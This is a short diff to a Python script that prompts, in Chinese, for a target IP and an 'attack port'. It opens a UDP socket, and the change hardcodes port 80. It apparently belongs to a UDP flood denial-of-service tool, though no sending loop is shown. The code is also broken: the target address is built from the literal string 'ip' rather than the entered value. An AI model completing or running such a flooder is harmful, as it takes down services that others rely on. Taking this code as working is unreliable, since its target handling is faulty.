@@ -10,9 +10,8 @@ import socket
 import os
 os.system("clear")
 
-target_addr = ('ip', port)
+target_addr = ('ip', 80)
 ip = input("请输入 IP     : ")
-port = int(input("攻击端口      : "))
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
